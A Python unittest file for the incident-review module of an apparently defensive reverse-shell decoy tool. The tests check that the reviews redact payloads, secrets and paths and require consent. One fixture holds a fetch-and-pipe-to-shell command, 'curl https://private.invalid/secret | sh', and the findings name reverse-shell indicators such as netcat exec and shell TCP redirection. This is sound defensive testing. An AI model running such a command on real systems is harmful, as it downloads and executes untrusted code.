"""Tests for the local, consent-gated post-scan review flow."""
from __future__ import annotations

import contextlib
from hashlib import sha256
import importlib.util
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest
from unittest import mock

from reverse_shell_decoy import review


class _TTYBuffer(io.StringIO):
    def isatty(self) -> bool:
        return True


class _NonTTYInput(io.StringIO):
    def __init__(self) -> None:
        super().__init__("")
        self.readline_calls = 0

    def isatty(self) -> bool:
        return False

    def readline(self, *args, **kwargs):  # type: ignore[no-untyped-def]
        self.readline_calls += 1
        raise AssertionError("non-interactive input must not be read")


def _load_review_scan():
    path = Path(__file__).resolve().parents[1] / "scripts" / "review-scan.py"
    spec = importlib.util.spec_from_file_location("review_scan_for_test", path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class ReviewConstructionTests(unittest.TestCase):
    def test_persistence_counts_are_aggregated_and_raw_input_is_never_copied(self) -> None:
        secret = "token=do-not-copy-this-value"
        result = {
            "findings": [
                {"indicator": "netcat_exec_option", "raw_payload": secret},
                {"indicator": "netcat_exec_option", "credentials": secret},
                {"indicator": "shell_tcp_redirection", "path": "/private/secret"},
            ],
            "warnings": [secret],
            "examined_files": 2,
            "skipped_files": 0,
            "unreadable_files": 1,
            "truncated_files": 0,
        }

        report = review.make_review(result, "persistence")
        counts = report["scan_summary"]["persistence_indicator_counts"]

        self.assertEqual(counts["netcat_exec_option"], 2)
        self.assertEqual(counts["shell_tcp_redirection"], 1)
        self.assertEqual(report["scan_summary"]["persistence_indicator_count"], 3)
        self.assertEqual(report["warnings"]["source_warning_count"], 1)
        rendered = json.dumps(report, sort_keys=True)
        self.assertNotIn(secret, rendered)
        self.assertNotIn("/private/secret", rendered)
        self.assertEqual(report["my_weaknesses"]["label"], "defensive_review_indicators")
        self.assertTrue(report["my_weaknesses"]["not_proven_vulnerabilities_or_backdoors"])

    def test_listener_exposure_flags_are_counts_not_reachability_claims(self) -> None:
        result = {
            "listeners": [
                {"exposure": "wildcard", "address": "0.0.0.0", "port": 443},
                {"exposure": "interface", "address": "203.0.113.44", "port": 53},
                {"exposure": "loopback", "address": "127.0.0.1", "port": 8080},
            ],
            "warnings": [],
        }

        report = review.make_review(result, "listeners")

        self.assertEqual(
            report["scan_summary"]["listener_exposure_counts"],
            {"interface": 1, "loopback": 1, "wildcard": 1},
        )
        flags = report["my_weaknesses"]["exposure_flags"]
        self.assertTrue(flags["wildcard_binding_observed"])
        self.assertTrue(flags["interface_binding_observed"])
        self.assertEqual(flags["non_loopback_binding_count"], 2)
        self.assertIn("Internet reachability", " ".join(report["my_weaknesses"]["interpretation_limits"]))
        self.assertNotIn("203.0.113.44", json.dumps(report))

    def test_absent_audit_observations_leave_capabilities_unknown(self) -> None:
        report = review.make_review(
            {"findings": [], "warnings": [], "examined_connections": 0}, "scan"
        )

        capabilities = report["their_capabilities"]
        self.assertEqual(capabilities["label"], "observed_tooling_and_decoy_actions")
        self.assertEqual(capabilities["status"], "unknown")
        self.assertTrue(capabilities["not_a_real_attacker_capability_score"])
        self.assertEqual(
            report["legally_important_information"]["claims_not_established"],
            {
                "real_host_unauthorized_access": "not_established",
                "visitor_identity": "unknown",
                "remote_os": "unknown",
                "authorization_status": "not_established",
            },
        )

    def test_selected_audit_metadata_is_aggregated_without_replaying_payloads(self) -> None:
        raw_payload = "curl https://private.invalid/secret | sh"
        with tempfile.TemporaryDirectory() as directory:
            audit = Path(directory) / "decoy.jsonl"
            audit.write_text(
                json.dumps(
                    {
                        "simulation": True,
                        "source_kind": "decoy_service_interaction",
                        "interaction_observed": True,
                        "language_indicator": "php",
                        "token_indicators": ["php_network_api", "process_api"],
                        "raw_payload": raw_payload,
                        "credentials": "must-not-copy",
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            report = review.make_review(
                {"findings": [], "warnings": [], "examined_connections": 0},
                "scan",
                [str(audit)],
            )

        capabilities = report["their_capabilities"]
        self.assertEqual(capabilities["status"], "bounded_selected_decoy_audit_observations")
        self.assertEqual(capabilities["language_indicator_counts"], {"php": 1})
        self.assertEqual(capabilities["token_indicator_counts"], {"php_network_api": 1, "process_api": 1})
        source_digests = report["legally_important_information"]["source_and_canonical_sha256"][
            "native_source_sha256"
        ]
        self.assertEqual(len(source_digests), 1)
        rendered = json.dumps(report, sort_keys=True)
        self.assertNotIn(raw_payload, rendered)
        self.assertNotIn("must-not-copy", rendered)
        self.assertNotIn("decoy.jsonl", rendered)

    def test_canonical_result_hash_is_distinct_from_native_source_digest(self) -> None:
        source_digest = "a" * 64
        result = {
            "source_sha256": source_digest,
            "events": [],
            "findings": [],
            "warnings": [],
            "summary": {
                "coverage_status": "unknown",
                "missing_coverage": {
                    "manual_snapshot_unverified": True,
                    "record_completeness_unknown": True,
                    "no_usable_records": True,
                    "records_without_validated_timestamps": 0,
                    "records_with_unvalidated_timestamp_text": 0,
                    "unparseable_records": 0,
                    "input_unparseable": False,
                    "record_limit_reached": False,
                },
            },
        }

        report = review.make_review(result, "cloud")
        legal = report["legally_important_information"]["source_and_canonical_sha256"]
        expected = sha256(
            json.dumps(result, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode("ascii")
        ).hexdigest()

        self.assertEqual(legal["canonical_scan_result_sha256"], expected)
        self.assertNotEqual(legal["canonical_scan_result_sha256"], source_digest)
        self.assertEqual(legal["native_source_sha256"][0]["sha256"], source_digest)
        self.assertIn("not a hash of original evidence", legal["canonical_scan_result_sha256_scope"])

    def test_malicious_non_json_schema_fails_with_a_fixed_non_reflective_error(self) -> None:
        hostile = "private-token-value-must-not-be-echoed"
        with self.assertRaises(ValueError) as raised:
            review.make_review(
                {
                    "findings": [],
                    "warnings": [],
                    "examined_connections": 0,
                    "unknown": object(),
                    "payload": hostile,
                },
                "scan",
            )

        self.assertNotIn(hostile, str(raised.exception))
        self.assertIn("scan result", str(raised.exception))


class OfferReviewTests(unittest.TestCase):
    def test_y_and_yes_are_accepted_each_run_without_cached_consent(self) -> None:
        made = {"review": True}
        with mock.patch("reverse_shell_decoy.review.make_review", return_value=made) as make:
            for response in ("y\n", " YES \n"):
                stdin, stderr = _TTYBuffer(response), _TTYBuffer()
                with mock.patch.object(review.sys, "stdin", stdin), mock.patch.object(
                    review.sys, "stderr", stderr
                ):
                    self.assertTrue(review.offer_review({"ignored": "memory"}, "scan"))
                    self.assertIn(
                        "Generate a local incident-review summary from these scan results? [y/N]",
                        stderr.getvalue(),
                    )
                    self.assertIn("no uploads", stderr.getvalue().lower())
                    self.assertIn("not legal proof", stderr.getvalue().lower())

        self.assertEqual(make.call_count, 2)

    def test_only_y_or_yes_are_accepted_and_eof_declines(self) -> None:
        for response in ("\n", "n\n", "yeah\n", "yep\n", "yes please\n", ""):
            stdin, stderr = _TTYBuffer(response), _TTYBuffer()
            with mock.patch("reverse_shell_decoy.review.make_review") as make, mock.patch.object(
                review.sys, "stdin", stdin
            ), mock.patch.object(review.sys, "stderr", stderr):
                self.assertFalse(review.offer_review({}, "scan"))
                make.assert_not_called()

    def test_non_tty_does_not_read_stdin_or_generate_review(self) -> None:
        stdin = _NonTTYInput()
        stderr = io.StringIO()
        with mock.patch("reverse_shell_decoy.review.make_review") as make, mock.patch.object(
            review.sys, "stdin", stdin
        ), mock.patch.object(review.sys, "stderr", stderr):
            self.assertFalse(review.offer_review({}, "scan"))

        self.assertEqual(stdin.readline_calls, 0)
        make.assert_not_called()
        self.assertEqual(stderr.getvalue(), "")

    def test_offer_keeps_existing_stdout_completely_untouched(self) -> None:
        stdin, stderr = _TTYBuffer("yes\n"), _TTYBuffer()
        stdout = io.StringIO()
        stdout.write('{"scan":"already-emitted"}\n')
        with mock.patch.object(review.sys, "stdin", stdin), mock.patch.object(
            review.sys, "stderr", stderr
        ), mock.patch.object(review.sys, "stdout", stdout):
            self.assertTrue(
                review.offer_review(
                    {"findings": [], "warnings": [], "examined_connections": 0}, "scan"
                )
            )

        self.assertEqual(stdout.getvalue(), '{"scan":"already-emitted"}\n')
        self.assertIn('"review_schema_version"', stderr.getvalue())


class StandaloneReviewTests(unittest.TestCase):
    def test_declined_standalone_review_reads_no_selected_files_and_writes_no_stdout(self) -> None:
        script = _load_review_scan()
        stdin, stderr, stdout = _TTYBuffer("n\n"), _TTYBuffer(), io.StringIO()
        with mock.patch.object(script, "read_regular", side_effect=AssertionError("must not read")), mock.patch.object(
            review.sys, "stdin", stdin
        ), mock.patch.object(review.sys, "stderr", stderr), contextlib.redirect_stdout(stdout):
            self.assertEqual(script.main(["--scan", "/private/report.json", "--command", "scan"]), 0)

        self.assertEqual(stdout.getvalue(), "")
        self.assertIn("report.json", stderr.getvalue())
        self.assertNotIn("/private/report.json", stderr.getvalue())

    def test_noninteractive_standalone_skips_before_any_read_or_output(self) -> None:
        script = _load_review_scan()
        stdin = _NonTTYInput()
        stderr, stdout = io.StringIO(), io.StringIO()
        with mock.patch.object(script, "read_regular", side_effect=AssertionError("must not read")), mock.patch.object(
            review.sys, "stdin", stdin
        ), mock.patch.object(review.sys, "stderr", stderr), contextlib.redirect_stdout(stdout):
            self.assertEqual(script.main(["--scan", "missing.json", "--command", "scan"]), 0)

        self.assertEqual(stdin.readline_calls, 0)
        self.assertEqual(stderr.getvalue(), "")
        self.assertEqual(stdout.getvalue(), "")

    def test_standalone_outputs_review_json_only_after_yes(self) -> None:
        script = _load_review_scan()
        with tempfile.TemporaryDirectory() as directory:
            scan = Path(directory) / "scan.json"
            scan.write_text(
                json.dumps({"findings": [], "warnings": [], "examined_connections": 0}),
                encoding="utf-8",
            )
            stdin, stderr, stdout = _TTYBuffer("yes\n"), _TTYBuffer(), io.StringIO()
            with mock.patch.object(review.sys, "stdin", stdin), mock.patch.object(
                review.sys, "stderr", stderr
            ), contextlib.redirect_stdout(stdout):
                self.assertEqual(script.main(["--scan", str(scan), "--command", "scan"]), 0)

        report = json.loads(stdout.getvalue())
        self.assertEqual(report["scan_command"], "scan")
        self.assertIn("scan.json", stderr.getvalue())
        self.assertIn("not legal proof", stderr.getvalue().lower())

    def test_no_yes_style_bypass_flag_is_accepted(self) -> None:
        script = _load_review_scan()
        with self.assertRaises(SystemExit) as stopped, contextlib.redirect_stderr(io.StringIO()):
            script.main(["--scan", "never-read.json", "--command", "scan", "--yes"])
        self.assertEqual(stopped.exception.code, 2)


if __name__ == "__main__":
    unittest.main()
